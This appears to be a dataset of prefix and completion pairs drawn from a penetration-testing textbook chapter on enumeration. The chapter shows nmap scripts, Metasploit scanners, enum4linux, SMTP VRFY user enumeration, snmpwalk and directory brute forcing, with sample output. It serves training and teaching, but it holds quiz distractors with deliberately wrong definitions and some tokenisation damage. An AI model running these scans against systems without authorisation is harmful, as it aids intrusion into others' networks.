"a false positive indicates a finding that does exist , while a","a false positive indicates a finding that does exist , while a false negative doesn ’ t indi-cate a finding that doesn ’ t exist"
"a false positive doesn ’ t indicate a finding that does exist ,","a false positive doesn ’ t indicate a finding that does exist , while a false negative does indicate a finding that doesn ’ t exist"
"a false negative does indicate a finding that doesn ’ t exist ,","a false negative does indicate a finding that doesn ’ t exist , while a false positive doesn ’ t indicate a finding that does exist"
if you were to notice operating system commands inside a dns request while,"if you were to notice operating system commands inside a dns request while looking at a packet capture , what might you be looking at ? a"
"once we have identified applications , though , we will want","once we have identified applications , though , we will want to dig deeper to see what additional information we can extract"
enumeration is about determining what services are running,enumeration is about determining what services are running and then extracting informa - tion from those services
"as an example , users may have to be authenticated","as an example , users may have to be authenticated and authorized to view some sections on a web server"
you may be able to get the web server to give you an indication what,"you may be able to get the web server to give you an indication what usernames are con - figured on the server , which would be an example of enumeration"
"because we are working on enumeration , we are going to take a close look","because we are working on enumeration , we are going to take a close look at a few protocols as well as the tools you would use with those protocols"
this is definitely a case where users would have to authenticate against the service,"this is definitely a case where users would have to authenticate against the service , so we can spend some time trying to find users on windows servers"
"additionally , you may be able to identify","additionally , you may be able to identify security policy infor-mation associated with the windows domain"
other protocols you may not think about when it comes to enumeration are the simple,other protocols you may not think about when it comes to enumeration are the simple mail transfer protocol ( smtp ) and the simple network management protocol ( snmp )
it ’ s common for users to have to authenticate and be authorized before sending email through,"it ’ s common for users to have to authenticate and be authorized before sending email through an smtp server , particularly if they are sending from outside the network where the mail server is"
"if you use a traditional mail client to connect with gmail or office 365 ,","if you use a traditional mail client to connect with gmail or office 365 , you are familiar with having to provide your username and password for your smtp server"
"your client may automatically fill that information in for you ,","your client may automatically fill that information in for you , but it ’ s there if you go looking at settings"
"if you can get access to an snmp system , you should be able to","if you can get access to an snmp system , you should be able to walk the management information base ( mib ) to extract details from your target system"
there are tools that will perform this walk for,"there are tools that will perform this walk for you , retrieving the information and presenting it to you"
"by the time we are done with this chapter , you should have a solid understanding of","by the time we are done with this chapter , you should have a solid understanding of what enumeration is as well as what tools you can use to enumerate different resources on systems"
many of these tools will be linux-based and run from the command line,"many of these tools will be linux-based and run from the command line , but there are some windows tools we ’ ll look at as well"
"in the following code listing , you can see a portion of","in the following code listing , you can see a portion of output from a version scan run by nmap on hosts on my network"
"it shows not just open ports but also , where it can find them , specifics about","it shows not just open ports but also , where it can find them , specifics about the services and versions that are running on the hosts that were found responding on the network"
it does this by looking at any application banners,it does this by looking at any application banners to extract details about the service name and version
0 ) 25/tcp closed smtp80/tcp open http greenbone security assistant443/tcp closed url address : 0e:76:03 : b8:2a : ba ( unknown,0 ) 25/tcp closed smtp80/tcp open http greenbone security assistant443/tcp closed url address : 0e:76:03 : b8:2a : ba ( unknown ) service info : os : linux ; cpe : cpe : /o : linux : linux_kernel nmap scan report for desktop-3rgc5h2
port state service version22/tcp filtered ssh25/tcp filtered smtp80/tcp filtered url filtered url address :,port state service version22/tcp filtered ssh25/tcp filtered smtp80/tcp filtered url filtered url address : c4:9d : ed : ab : dd:7a ( microsoft ) nmap scan report for milobloom
one thing we can see in the previous listing is a,one thing we can see in the previous listing is a handful of systems that are running secure shell ( ssh )
"nmap has scripting capabilities , and there are a","nmap has scripting capabilities , and there are a lot of scripts that will enumerate services for more details"
"ssh encrypts data between the client and the server , but the cipher suites","ssh encrypts data between the client and the server , but the cipher suites used may vary between connections , since clients can sup-port different key strengths and algorithms"
here you can see the use of the script,"here you can see the use of the script used to enumerate the algorithms across ssh servers , ssl-enum-ciphers"
ssh2 algorithm enumeration port state service 22/tcp open ssh| ssh2-enum-algos :,ssh2 algorithm enumeration port state service 22/tcp open ssh| ssh2-enum-algos : | kex_algorithms : ( 10 ) | curve25519-sha256| curve25519-sha256 @ libssh
org| ecdh-sha2-nistp256| ecdh-sha2-nistp384| ecdh-sha2-nistp521| diffie-hellman-group-exchange-sha256| diffie-hellman-group16-sha512| diffie-hellman-group18-sha512| diffie-hellman-group14-sha256| diffie-hellman-group14-sha1| server_host_key_algorithms : ( 5 ),org| ecdh-sha2-nistp256| ecdh-sha2-nistp384| ecdh-sha2-nistp521| diffie-hellman-group-exchange-sha256| diffie-hellman-group16-sha512| diffie-hellman-group18-sha512| diffie-hellman-group14-sha256| diffie-hellman-group14-sha1| server_host_key_algorithms : ( 5 ) | ssh-rsa| rsa-sha2-512| rsa-sha2-256| ecdsa-sha2-nistp256| ssh-ed25519| encryption_algorithms : ( 6 ) | chacha20-poly1305 @ openssh
com | hmac-sha2-256 | hmac-sha2-512 | hmac-sha1 | compression_algorithms,com | hmac-sha2-256 | hmac-sha2-512 | hmac-sha1 | compression_algorithms : ( 2 ) | none |_ zlib @ openssh
com mac address : 0e:76:03 : b8:2a : ba ( unknown,com mac address : 0e:76:03 : b8:2a : ba ( unknown ) you will see a collection of algorithm types in the output
"one of them is the diffi e-hellman algorithm , named for whitfi eld diffi e","one of them is the diffi e-hellman algorithm , named for whitfi eld diffi e and martin hellman , who were the fi rst to publish an algorithm for key exchange"
the key exchange algorithm is important because the key is essential for,the key exchange algorithm is important because the key is essential for encryption and it is generated at the time a connection is made
most of these are the advanced encryption standard ( aes,"most of these are the advanced encryption standard ( aes ) , though you ’ ll notice one is named chacha20"
this is a stream cipher like aes that can allow programs,this is a stream cipher like aes that can allow programs to use encryption without the need for an open-source encryption library
"finally , there is the message authentication code , used to","finally , there is the message authentication code , used to ensure that the message wasn ’ t tampered with or corrupted"
diffie and hellman were the first to publish a key exchange,"diffie and hellman were the first to publish a key exchange algorithm , but they were not the first to develop one"
government intelligence agencies had already come up with,government intelligence agencies had already come up with key exchange algorithms separately from diffie and hellman
the difference was that the agency employees were unable to publish,the difference was that the agency employees were unable to publish because their work couldn ’ t be disclosed outside of the agency
certainly nmap can provide you with a good start on getting a list,"certainly nmap can provide you with a good start on getting a list of services and ver- sion numbers , but it ’ s not always enough"
"these scripts can be used to extract a lot of information ,","these scripts can be used to extract a lot of information , like the algorithms in ssh , that are otherwise diffi cult to attain"
"ssh may provide encryption services , but not","ssh may provide encryption services , but not all of the encryption algorithms are free from vulnerabilities"
"as far as the program on the local computer calling the remote procedure is concerned , it","as far as the program on the local computer calling the remote procedure is concerned , it ’ s a local procedure existing in the same process space as the rest of the code"
"remote commonly means a remote server , but two local","remote commonly means a remote server , but two local processes could also use rpcs to communicate with one another"
"before that , there was the common object request broker","before that , there was the common object request broker architecture ( corba ) , which was independent of language implementation"
"sometimes , with rpcs , you need what is essentially a directory","sometimes , with rpcs , you need what is essentially a directory service to indicate the dynamic ports on which different services are running"
this program is used to provide information about programs that have,"this program is used to provide information about programs that have been registered with the portmapper service , providing these remote procedures"
the portmapper assigns a port for the service to listen,"the portmapper assigns a port for the service to listen on and , when queried , can provide that information back"
common examples of services that use rpcbind/portmap are file,common examples of services that use rpcbind/portmap are file sharing servers like network file server ( nfs )
the package that provides the portmapper or rpcbind service,the package that provides the portmapper or rpcbind service may also provide utilities that can also communicate using rpc
"the program portmapper is the primary service that is queried for additional data , but","the program portmapper is the primary service that is queried for additional data , but the others , like mountd , nfs , and nlockmanager , are all needed for nfs"
this is the case with a scanner in metasploit that can also,this is the case with a scanner in metasploit that can also be used to identify the ports allocated to programs using the portmapper
metasploit sunrpc scanner msf > use auxiliary/scanner/misc/sunrpc_portmapper msf,metasploit sunrpc scanner msf > use auxiliary/scanner/misc/sunrpc_portmapper msf auxiliary ( scanner/misc/sunrpc_portmapper ) > set rhosts 192
since all that is happening is query- ing the portmapper process,"since all that is happening is query- ing the portmapper process , you can use whatever tool makes you the most comfortable"
the second is that you won ’ t get all of the ports,the second is that you won ’ t get all of the ports using nmap unless you specifically indicate that you want to scan all ports
remote method invocation java programs are very popular,"remote method invocation java programs are very popular , especially when it comes to web applications"
"java pro-vides a lot of assistance to programmers , especially when it","java pro-vides a lot of assistance to programmers , especially when it comes to libraries and inter-faces that can be implemented with your own functionality"
"java includes its own capability for remote procedure calls , though","java includes its own capability for remote procedure calls , though in java it ’ s called remote method invocation ( rmi )"
"in order to have a program that uses rmi , the","in order to have a program that uses rmi , the system needs a version of the portmapper for java called the rmiregistry"
the rmiregistry program will respond in a similar way,the rmiregistry program will respond in a similar way to what we saw when we checked with the portmapper
when a programmer is creating a program that uses rmi,"when a programmer is creating a program that uses rmi , they use an rmi compiler ( the program rmic )"
the programs we use to connect to an rmi registry to enumerate services that are registered don ’ t need to know the specific interfaces needed,the programs we use to connect to an rmi registry to enumerate services that are registered don ’ t need to know the specific interfaces needed to pass objects between the skeleton and the stub because the only thing the enumeration is doing is identifying the skeletons or services on the remote system
you can see an example of using metasploit for rmi enumeration here : running rmi scanner in metasploit msf > use auxiliary/gather/java_rmi_registry msf auxiliary ( gather/java_rmi_registry ) > show options module options ( auxiliary/gather/java_rmi_registry ) : name current setting required description --,you can see an example of using metasploit for rmi enumeration here : running rmi scanner in metasploit msf > use auxiliary/gather/java_rmi_registry msf auxiliary ( gather/java_rmi_registry ) > show options module options ( auxiliary/gather/java_rmi_registry ) : name current setting required description -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- - rhost yes the target address rport 1099 yes the target port ( tcp ) msf auxiliary ( gather/java_rmi_registry ) > set rhost 192
1:38371 [ * ] auxiliary module execution completed the,1:38371 [ * ] auxiliary module execution completed the options required to run the java_rmi_registry module are simple
we set this variable to the ip address of the system where,we set this variable to the ip address of the system where there is a very simple java pro-gram that implements an rmi server
"since it ’ s a java program , you have to run the intermediate","since it ’ s a java program , you have to run the intermediate code fi le through the java pro- gram used to create a java virtual machine"
"since it ’ s stored as a java archive ( jar ) , you","since it ’ s stored as a java archive ( jar ) , you have to tell java that it is going to be running from one of those"
the program does need to know what host it ’ s,"the program does need to know what host it ’ s scanning , so you pass in the ip address of your target"
written by nicky bloor ( @ nickstadb ) warning : barmie was written to aid security professionals,written by nicky bloor ( @ nickstadb ) warning : barmie was written to aid security professionals in identifying the insecure use of rmi services on systems which the user has prior permission to attack
the developers assume no liability and are not responsible,the developers assume no liability and are not responsible for any misuse or damage caused by this program
socketexception : socket closed [ - ],socketexception : socket closed [ - ] an exception occurred during the replydatacapturingproxythread main loop
remoteobject class 3 classname : helloimpl_stub 1 potential attacks identified ( +++ = more reliable ) [ -- - ] java rmi registry illegal bind deserialization 0 deserialization gadgets,remoteobject class 3 classname : helloimpl_stub 1 potential attacks identified ( +++ = more reliable ) [ -- - ] java rmi registry illegal bind deserialization 0 deserialization gadgets found on leaked classpath [ ~ ] gadgets may still be present despite classpath not being leaked successfully scanned 1 target ( s ) for objects exposed via rmi
"just as with metasploit , we see that the server is bound to","just as with metasploit , we see that the server is bound to the localhost on port 38371 , which was dynamically allocated by the rmiregistry"
in order to attempt to identify vulner-abilities with that rmi server and,"in order to attempt to identify vulner-abilities with that rmi server and potentially exploit those vulnerabilities , we need to gain access to the system"
"in identifying the rmi registry and the additional services , we have","in identifying the rmi registry and the additional services , we have also identified the existence of another piece of software on the target system"
"it may seem obvious now but if you find an rmi registry and rmi services , you have found a system that","it may seem obvious now but if you find an rmi registry and rmi services , you have found a system that at least has a java runtime engine ( jre ) on it , if not a java development kit ( jdk )"
the smb protocol is complex when you consider all the different ways,the smb protocol is complex when you consider all the different ways it can be used and all the different ways it will operate
"while this is defi-nitely one use for smb , it is not the only one , and even when","while this is defi-nitely one use for smb , it is not the only one , and even when you think about sharing files , there is a lot more than just transmitting file contents across a network"
"smb can also operate over session protocols like netbios , which is an application pro-gramming interface ( api )","smb can also operate over session protocols like netbios , which is an application pro-gramming interface ( api ) developed by ibm to extend the input/output ( i/o ) capabilities away from the local system and onto the network"
"if you see udp ports 137 and 138 open , you","if you see udp ports 137 and 138 open , you will know that you have found smb running on top of netbios"
"however , if you find tcp ports 137 and 139 open","however , if you find tcp ports 137 and 139 open , you will have found smb running on netbios over tcp"
"so , just what is smb good for ? smb is used","so , just what is smb good for ? smb is used for communicating between windows systems—file sharing , network management , system administration"
systems have to be able to provide the list of,systems have to be able to provide the list of shares they are exporting to the net-work to systems that ask
a system can request information about another system on the,"a system can request information about another system on the network using null authentication , meaning no credentials were passed"
"actually , it ’ s not even just windows systems , though the","actually , it ’ s not even just windows systems , though the intent of implementing smb on other systems is to interoperate with windows systems"
samba is a package that can be installed on unix-like operating,"samba is a package that can be installed on unix-like operating systems , providing smb as well as a netbios naming ser-vice"
"one is smbd , which handles smb , and there is also","one is smbd , which handles smb , and there is also nmbd , which handles the naming aspects of interoperating with windows systems"
this means that even while we are looking to enumerate information,"this means that even while we are looking to enumerate information from windows systems , we can also scoop up unix-like systems"
built-in tools are especially available on windows systems,"built-in tools are especially available on windows systems , but there are unix-like utilities as well"
"built-in utilities if you are on a windows system , there are a","built-in utilities if you are on a windows system , there are a number of utilities that you can make use of to gather information using smb"
one thing to make note of with regard to the built-in utilities is that you,one thing to make note of with regard to the built-in utilities is that you need to be on the same broadcast domain in order to make use of them
netbios was originally developed to be used in a local area network,"netbios was originally developed to be used in a local area network , rather than with the concept of wide area networks built in"
"as a result , some of the functions work","as a result , some of the functions work because systems rely on broadcasting information to the network"
the implication of this is that you need to have,the implication of this is that you need to have a presence on the local network before these utilities will work
nbtstat output c : \users\kilroy > nbtstat -a billthecat,nbtstat output c : \users\kilroy > nbtstat -a billthecat local area connection : node ipaddress : [ 192
50 ] scope id : [ ] netbios remote machine name table name type status -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - billthecat < 00,"50 ] scope id : [ ] netbios remote machine name table name type status -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - billthecat < 00 > unique registered billthecat < 20 > unique registered workgroup < 00 > group registered mac address = ac-87-a3-36-d6-aa the codes shown are from netbios , and you can look up the code to determine what the name is associated with"
it ’ s important to distinguish the capabilities because then each system can know,it ’ s important to distinguish the capabilities because then each system can know the types of questions that can be asked of each of the other systems
"we can ’ t call procedures that don ’ t exist , so before procedures are called","we can ’ t call procedures that don ’ t exist , so before procedures are called on the remote systems to initiate an action , we have to know what procedures are available"
what we ’ ve seen so far simply asks for all of,what we ’ ve seen so far simply asks for all of the functions ( names ) associated with a hostname on the network
if we want to see all of the host-names that,"if we want to see all of the host-names that are talking smb/netbios , we need to ask for something else"
this list can come from broadcast messages when there is no centralized database for name,this list can come from broadcast messages when there is no centralized database for name lookups—systems announce their names and their presence when they come online and then periodically after that
it can also come from the windows internet name server ( wins ),"it can also come from the windows internet name server ( wins ) , which is a central repository of names of systems on an enterprise network"
"windows servers will have wins functionality , so systems","windows servers will have wins functionality , so systems register with the wins and all names can be resolved"
"since there is no windows server and , as a result , no wins","since there is no windows server and , as a result , no wins on the network , these are all names that have been identified through broadcast messages"
"if you have a linux system and have the samba package installed , which provides services","if you have a linux system and have the samba package installed , which provides services that allow linux to communicate using smb , you can make use of the tool nmblookup"
it can be used to query wins as well as,it can be used to query wins as well as look up names where the systems are just broad-casting their information
"for example , to get the details about the system billthecat as we did","for example , to get the details about the system billthecat as we did earlier , you would use nmblookup -s -r billthecat , as you can see here"
32 billthecat < 00 > - h < active > billthecat < 20 > - h < active > workgroup < 00 > - < group > h <,"32 billthecat < 00 > - h < active > billthecat < 20 > - h < active > workgroup < 00 > - < group > h < active > mac address = ac-87-a3-36-d6-aa using -b tells nmblookup to use the broadcast address that is supplied , which is just the broadcast address on the local network"
"just as we did earlier , we can see that we have a workstation","just as we did earlier , we can see that we have a workstation ( < 00 > ) and also a file server ( < 20 > )"
"you ’ ll also see from this output , just as","you ’ ll also see from this output , just as we did earlier , that the system belongs to the workgroup workgroup"
workgroups are used for ad hoc windows networks where there,workgroups are used for ad hoc windows networks where there is no domain controller to manage all of the systems
"nmap scripts nmap continues to be relevant to us ,","nmap scripts nmap continues to be relevant to us , even though we ’ ve moved beyond the port scanning phase"
"at the time of this writing , there are 33 smb-related scripts","at the time of this writing , there are 33 smb-related scripts included in the implementation of nmap on the latest version of kali linux"
you ’ ll see that nmap has identified it very,"you ’ ll see that nmap has identified it very specifically , down to the service pack that has been installed"
"interestingly , there are several other systems on the network where","interestingly , there are several other systems on the network where smb-based sharing is enabled , but none of them get identified"
the big difference between those and this one is that those systems only,the big difference between those and this one is that those systems only have port 445 open while this one also has ports 135 and 139 open
port state service135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsmac address : 46:5e : c8:0a : b7 : d1 ( unknown ),port state service135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsmac address : 46:5e : c8:0a : b7 : d1 ( unknown ) host script results : | smb-os-discovery : | os : windows 7 professional 7601 service pack 1 ( windows 7 professional 6
1 ) | os cpe : cpe : /o : microsoft : windows_7 : :sp1 : professional| computer name : stevedallas| netbios computer,1 ) | os cpe : cpe : /o : microsoft : windows_7 : :sp1 : professional| computer name : stevedallas| netbios computer name : stevedallas\x00| workgroup : workgroup\x00|_ system time : 2018-08-17t20:30:27-06:00 there are several important pieces of information we can use nmap to look for
any operating system after that will require authentication before,any operating system after that will require authentication before accessing the interprocess communication needed to extract the information requested
"however , the setting can be disabled , and you never","however , the setting can be disabled , and you never know when you will run across very outdated or misconfigured systems"
the listing shows that even though authen - tication,"the listing shows that even though authen - tication was required , it still attempted common share names"
50\admin $ : | warning : could n't get details for,50\admin $ : | warning : could n't get details for share : nt_status_access_denied| anonymous access : < none > | \\192
50\c $ : | warning : could n't get details for,50\c $ : | warning : could n't get details for share : nt_status_access_denied| anonymous access : < none > | \\192
50\ipc $ : | warning : could n't get,50\ipc $ : | warning : could n't get details for share : nt_status_access_denied| anonymous access : read| \\192
50\users : | warning : could n't get details for share : nt_status_access_denied|_ anonymous,50\users : | warning : could n't get details for share : nt_status_access_denied|_ anonymous access : < none > one of the common share names tried is ipc $
this is a share name allowing access to shared,"this is a share name allowing access to shared pipes , which is a method for interprocess communications"
"again , older ver-sions of windows will allow easier access to this share , but","again , older ver-sions of windows will allow easier access to this share , but since windows xp , there have been more restrictions on the use of this share"
"it does enable administrators to function remotely ,","it does enable administrators to function remotely , but accessing it requires more than just login credentials"
while nmap does have other scripts that can be used against,"while nmap does have other scripts that can be used against systems running smb , most of them are not for enumeration"
"since we are focusing on enumeration , we can put","since we are focusing on enumeration , we can put off looking at those other scripts until a later time"
"as shown earlier , we can definitely use it for enumeration , and","as shown earlier , we can definitely use it for enumeration , and when it comes to smb , there are several that you can run"
the windows xp system is running smb version 1 because version,the windows xp system is running smb version 1 because version 2 didn ’ t come out until windows vista was released
smb version scan with metasploit msf auxiliary ( scanner/smb/smb_version ) > run [ *,smb version scan with metasploit msf auxiliary ( scanner/smb/smb_version ) > run [ * ] scanned 26 of 256 hosts ( 10 % complete ) [ * ] 192
49:445 - host is running windows xp sp2 ( language : english ),49:445 - host is running windows xp sp2 ( language : english ) ( name : opus-c765f2 ) ( workgroup : workgroup ) [ + ] 192
50:445 - host is running windows 7 professional sp1 ( build:7601 ) ( name : stevedallas ) ( workgroup,50:445 - host is running windows 7 professional sp1 ( build:7601 ) ( name : stevedallas ) ( workgroup : workgroup ) [ * ] scanned 52 of 256 hosts ( 20 % complete ) [ * ] 192
"this is not required , though you ’ re much less","this is not required , though you ’ re much less likely to get a list of users with-out authentication of some sort"
] record_guest false no record guest-privileged random logins to the database rhosts yes the target,] record_guest false no record guest-privileged random logins to the database rhosts yes the target address range or cidr identifier rport 445 yes the smb service port ( tcp ) smbdomain
"this is commonly disallowed by password policies , but you may run across systems where password policies","this is commonly disallowed by password policies , but you may run across systems where password policies aren ’ t in place , making it possible for the username and password to be the same"
this makes it a good recordkeeping tool as well as a,this makes it a good recordkeeping tool as well as a tool that can be used for enumeration and other forms of scanning
"other utilities considering the number of devices that use smb for networking , it","other utilities considering the number of devices that use smb for networking , it ’ s not surprising that there are many tools available for enumerating smb systems"
"it provides details about systems it finds on the local network ,","it provides details about systems it finds on the local network , including the netbios name , user , mac address , and ip address"
"in the following listing , you can see the output of scanning","in the following listing , you can see the output of scanning my home network , identifying every system that has windows shares available"
the scan range has been provided on the command line here,"the scan range has been provided on the command line here , but you can also provide the ip addresses in a file"
0/24 ip address netbios name server user mac address -- -- -- -- -- -- -- -- -- -- -- -- -- -- --,0/24 ip address netbios name server user mac address -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 192
"255 sendto failed : permission denied getting the output here , just as with any tool , is helpful , but at","255 sendto failed : permission denied getting the output here , just as with any tool , is helpful , but at some point you need to do something with the information , not least putting it into a report for your client or employer"
one nice thing about nbtscan is the ability,one nice thing about nbtscan is the ability to generate output that can be manip-ulated programmatically
"while you can certainly read in values with white space separators , nbtscan lets you specify a separator that may make it easier to","while you can certainly read in values with white space separators , nbtscan lets you specify a separator that may make it easier to read in the output , but you can also specify a comma as a separator and then open the output in a spreadsheet program"
"while there are a lot of tools available , they all perform the same functions , and the easiest thing to","while there are a lot of tools available , they all perform the same functions , and the easiest thing to do when it comes to enumeration is to identify systems that use smb , including the name they advertise on the network"
this means it won ’ t resolve using dns unless,this means it won ’ t resolve using dns unless dns is configured to use the same names and ip addresses
it ’ s possible to have one name for your windows sharing and,"it ’ s possible to have one name for your windows sharing and another one for your dns , assuming the system even has a dns address"
"if your enter-prise network uses wins , they will resolve to","if your enter-prise network uses wins , they will resolve to be the same because of how the local systems register to wins"
the following example is being run from a kali linux system where it is installed,"the following example is being run from a kali linux system where it is installed by default , but it ’ s easy enough to get a copy of it"
the target system is a linux system running,the target system is a linux system running samba to provide windows net-working functionality over smb
"as an example , we can see that the workgroup workgroup is configured , which","as an example , we can see that the workgroup workgroup is configured , which is a way of organizing systems on a local network that are all using windows"
9 ( url enum4linux/ ) on sun aug,9 ( url enum4linux/ ) on sun aug 19 12:18:25 2018 ==========================| target information | ==========================target
"administrator , guest , krbtgt , domain admins ,","administrator , guest , krbtgt , domain admins , root , bin , none =====================================================| enumerating workgroup/domain on 192"
"52 allows sessions using username `` ,","52 allows sessions using username `` , password `` ============================================| getting domain sid for 192"
52 | ============================================domain name : washeredomain sid : ( null sid ) [ + ] can ’,52 | ============================================domain name : washeredomain sid : ( null sid ) [ + ] can ’ t determine if host is part of domain or part of a workgroup ==========================================| share enumeration on 192
52 | ==========================================warning : the `` syslog '' option is deprecated sharename type comment -- -- -- -- - -- -- -- -- -- - homes disk,"52 | ==========================================warning : the `` syslog '' option is deprecated sharename type comment -- -- -- -- - -- -- -- -- -- - homes disk home directories print $ disk printer drivers ipc $ ipc ipc service ( bobbie server ( samba , ubuntu ) ) reconnecting with smb1 for workgroup listing"
server comment -- -- -- -- - -- -- -- - workgroup master -- -- --,server comment -- -- -- -- - -- -- -- - workgroup master -- -- -- -- - -- -- -- - workgroup stevedallas [ + ] attempting to map shares on 192
the system named stevedallas holds the current authoritative,the system named stevedallas holds the current authoritative list of all of the systems on the network
"this is a system that has been elected by other systems on the network , which essentially","this is a system that has been elected by other systems on the network , which essentially means it has volunteered and , based on its characteristics , no one else has challenged it"
"as noted earlier , it ’ s generally necessary to be on","as noted earlier , it ’ s generally necessary to be on the local network to be able to use any of these tools"
one reason for this can be the broadcast,one reason for this can be the broadcast domain orientation of windows networking—announcements on the local network
"also , it ’ s entirely possible that desktop net-works , where the systems are most likely to","also , it ’ s entirely possible that desktop net-works , where the systems are most likely to be communicating with smb , often use private addresses that may not be exposed to the outside world"
"in order to get to them , because they are non-routable by convention , you ’ d have to be on","in order to get to them , because they are non-routable by convention , you ’ d have to be on a network where there would at least be routing rules to get to those target networks , meaning there is network reachability"
"while desktops are not the only devices that will communicate using smb , since servers do as","while desktops are not the only devices that will communicate using smb , since servers do as well , they are the systems that are going to be the most numerous in most instances"
"as always , when you are starting to look at the desktops ,","as always , when you are starting to look at the desktops , make sure you have an agree-ment to look at them with your employer"
not everyone will want the desktop networks to be,not everyone will want the desktop networks to be touched because it can impede productivity for their users
"they may also feel like they are most interested in traditional , technical vulnerabilities that are exposed to the outside world ,","they may also feel like they are most interested in traditional , technical vulnerabilities that are exposed to the outside world , without thinking about lateral movement within the organization or the fact that the desktops are the most common target with attackers today"
simple network management protocol the simple network management protocol ( snmp ) has been,"simple network management protocol the simple network management protocol ( snmp ) has been around since the late ’ 80s , though it has gone through several iterations"
"however , alongside v2 came v2c , which","however , alongside v2 came v2c , which retained the implementation of the community strings for authentication"
this meant that existing tools could continue to just use,this meant that existing tools could continue to just use com-munity strings without having to implement any additional authentication mechanisms
version 3 implemented additional fixes and is considered,version 3 implemented additional fixes and is considered to be a significant improvement over the previous versions
"this is important , since snmp can be used not only","this is important , since snmp can be used not only to monitor devices but also to set parameters on the endpoint"
"a basic snmp architecture would have agents installed on endpoints , while a server","a basic snmp architecture would have agents installed on endpoints , while a server system could be used to poll those agents periodically to get measurements for monitoring purposes"
each node or data element gets an object identifier ( oid,"each node or data element gets an object identifier ( oid ) , which is a long dotted string of numeric values"
getting or setting any value from the agent requires sup-plying the,getting or setting any value from the agent requires sup-plying the correct oid that corresponds with the value you are looking for
snmp can supply a lot of different information that is useful,snmp can supply a lot of different information that is useful if the right mibs are installed and operating correctly on the agent
"in the following example , you can see the use of the program","in the following example , you can see the use of the program snmpwalk to “ walk ” the mib tree to gather data from the agent"
"if you walk the iftable , you will get a list of","if you walk the iftable , you will get a list of all of the interfaces on the system and how they are configured"
"in a tiered network design , you can get an","in a tiered network design , you can get an understanding of additional networks the system may be connected to"
"with this information , you can continue to build out the","with this information , you can continue to build out the network map you have been creating as you identify networks and systems"
one advantage to snmp is that it is perhaps,one advantage to snmp is that it is perhaps most commonly used on network equipment like routers and switches
as these may not have traditional means of gaining access and may not have more traditional ideas,"as these may not have traditional means of gaining access and may not have more traditional ideas of users , using snmp to gather information from these devices can be a good entry point"
"in other words , you would usually have to be allowed specific access to the network device through","in other words , you would usually have to be allowed specific access to the network device through a firewall or access control list before you could start to request mib data from a network device"
snmp agents that are properly implemented and configured shouldn ’ t,snmp agents that are properly implemented and configured shouldn ’ t just give out sensitive system information to anyone who asks for it
"simple mail transfer protocol like so many other protocols , smtp","simple mail transfer protocol like so many other protocols , smtp operates using a series of verbs to interact with the server"
"this is entirely manual , so you can see the conversation at","this is entirely manual , so you can see the conversation at the protocol level and how you might interact with an smtp server"
0 ok : queued as 33471301389 once you initiate the conversation using either helo,"0 ok : queued as 33471301389 once you initiate the conversation using either helo or ehlo , you will get a list of capabilities offered by the server"
there are a couple of capabilities in smtp that we,there are a couple of capabilities in smtp that we can use to enumerate users or at least email addresses
"not all mail servers will have this feature enabled , since","not all mail servers will have this feature enabled , since it can be used to identify legitimate users or email addresses"
here you can see an example of the use of vrfy against,"here you can see an example of the use of vrfy against a local mail server running postfix , which has vrfy enabled by default"
the module smtp_ enum will take a word list and,the module smtp_ enum will take a word list and do the same thing automatically that you saw done manu-ally earlier
this is using the default word list that comes with,this is using the default word list that comes with metasploit that has a list of common unix usernames ( unix_users
smtp_enum run msf auxiliary ( scanner/smtp/smtp_enum ) > use,smtp_enum run msf auxiliary ( scanner/smtp/smtp_enum ) > use auxiliary/scanner/smtp/smtp_enum msf auxiliary ( scanner/smtp/smtp_enum ) > set rhosts 192
"52:25 users found : , backup , bin , daemon , games , gnats , irc , list , lp , mail , man , messagebus , news , nobody , postmaster , proxy , sshd , sync , sys , syslog","52:25 users found : , backup , bin , daemon , games , gnats , irc , list , lp , mail , man , messagebus , news , nobody , postmaster , proxy , sshd , sync , sys , syslog , uucp , www-data [ * ] scanned 1 of 1 hosts ( 100 % complete ) [ * ] auxiliary module execution completed you ’ ll notice that there are a lot of users listed as being found by this module"
based on the fact that the vrfy command returned a 252 and the users,"based on the fact that the vrfy command returned a 252 and the users are ones that exist on this system , the module isn ’ t using vrfy"
"based on the results of this , the module returns valid usernames , since","based on the results of this , the module returns valid usernames , since out of the 112 users in the list , only 21 users were identified"
you can test whether a server supports esmtp by checking to see,"you can test whether a server supports esmtp by checking to see whether it accepts ehlo , which is the esmtp version of helo"
"web-based enumeration as far as enumeration goes , there may be","web-based enumeration as far as enumeration goes , there may be a couple of things we want to look at on web servers"
there are a lot of different ways to do this,"there are a lot of different ways to do this , especially if you have access to web application testing tools"
all you need is a word list that can provide potential directory names and a tool that can make,all you need is a word list that can provide potential directory names and a tool that can make requests to a web server based on those words—appending each word to a base uniform resource locator ( url )
"here , you can see the use of the program dirb","here , you can see the use of the program dirb , which includes its own word list of common directory names"
this was run against a web server on my own network,this was run against a web server on my own network that had the wordpress distribution unzipped into the base web directory
22by the dark raver -- -- -- -- -- -- --,22by the dark raver -- -- -- -- -- -- -- -- - start_time : sun aug 19 19:38:36 2018url_base : url /usr/share/dirb/wordlists/common
using a word list doesn ’ t guarantee that you are,using a word list doesn ’ t guarantee that you are going to identify all directories that are avail- able on the server
we can turn to another tool to help with fuzzing directory,"we can turn to another tool to help with fuzzing directory names , meaning generating names dynamically based on a set of rules"
"using this mod-ule , you set a format for what a directory name could or","using this mod-ule , you set a format for what a directory name could or should look like and the module will run through all possible names that match the format"
we ’ re going to be testing against all words,we ’ re going to be testing against all words with lowercase characters whose lengths are between one and eight characters
brute_dirs metasploit module msf > use auxiliary/scanner/url msf auxiliary ( scanner/url > info name : http directory brute force,brute_dirs metasploit module msf > use auxiliary/scanner/url msf auxiliary ( scanner/url > info name : http directory brute force scanner module : auxiliary/scanner/url license : bsd license rank : normal provided by : et < et @ metasploit
